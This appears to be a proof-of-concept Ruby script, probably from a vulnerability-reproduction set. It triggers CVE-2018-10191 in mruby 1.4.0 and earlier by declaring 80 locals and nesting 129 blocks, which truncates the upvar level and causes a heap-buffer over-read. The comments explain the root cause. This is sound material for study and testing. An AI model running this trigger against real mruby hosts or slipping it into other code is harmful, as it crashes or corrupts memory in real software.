# CVE-2018-10191 -- OP_GETUPVAR scope-level truncation (mruby <= 1.4.0).
#
# mruby packs the OP_GETUPVAR operands into one 32-bit instruction word:
#   B = the local's index within the target scope   -- 9 bits (max 511)
#   C = how many scopes to walk outward ("level")   -- 7 bits (max 127)
# codegen.c:2191 emits MKOP_ABC(OP_GETUPVAR, cursp(), idx, lv) with no check
# that `lv` fits in 7 bits, so at nesting depth >= 129 the level SILENTLY
# TRUNCATES (129 & 0x7f == 1).
#
# uvenv() then walks only 1 scope out instead of 129 and returns the wrong,
# much smaller environment. vm.c:1208 reads e->stack[B] on it -- with B still
# the large index from the outer scope -- so the read lands far past the end of
# that environment's storage.
#
# Two knobs, both required:
#   * 129 nested blocks  -> forces the level truncation (>= 129).
#   * 80 outer locals   -> makes B large enough to overshoot (~80 is the
#                          threshold; below that the stray read stays in bounds).
#
# Deterministic: purely a function of nesting depth and local count. No GC
# timing, allocation layout, or randomness involved.
#
# NOTE ON BUG CLASS: this reproduces as a heap-buffer-overflow (spatial), NOT a
# use-after-free. See target.md "Bug-class discrepancy".

v0 = 0
v1 = 1
v2 = 2
v3 = 3
v4 = 4
v5 = 5
v6 = 6
v7 = 7
v8 = 8
v9 = 9
v10 = 10
v11 = 11
v12 = 12
v13 = 13
v14 = 14
v15 = 15
v16 = 16
v17 = 17
v18 = 18
v19 = 19
v20 = 20
v21 = 21
v22 = 22
v23 = 23
v24 = 24
v25 = 25
v26 = 26
v27 = 27
v28 = 28
v29 = 29
v30 = 30
v31 = 31
v32 = 32
v33 = 33
v34 = 34
v35 = 35
v36 = 36
v37 = 37
v38 = 38
v39 = 39
v40 = 40
v41 = 41
v42 = 42
v43 = 43
v44 = 44
v45 = 45
v46 = 46
v47 = 47
v48 = 48
v49 = 49
v50 = 50
v51 = 51
v52 = 52
v53 = 53
v54 = 54
v55 = 55
v56 = 56
v57 = 57
v58 = 58
v59 = 59
v60 = 60
v61 = 61
v62 = 62
v63 = 63
v64 = 64
v65 = 65
v66 = 66
v67 = 67
v68 = 68
v69 = 69
v70 = 70
v71 = 71
v72 = 72
v73 = 73
v74 = 74
v75 = 75
v76 = 76
v77 = 77
v78 = 78
v79 = 79

# Read the outermost local (highest index) from 129 scopes in.
x = "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { "a".instance_eval { v79 } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } }
puts x
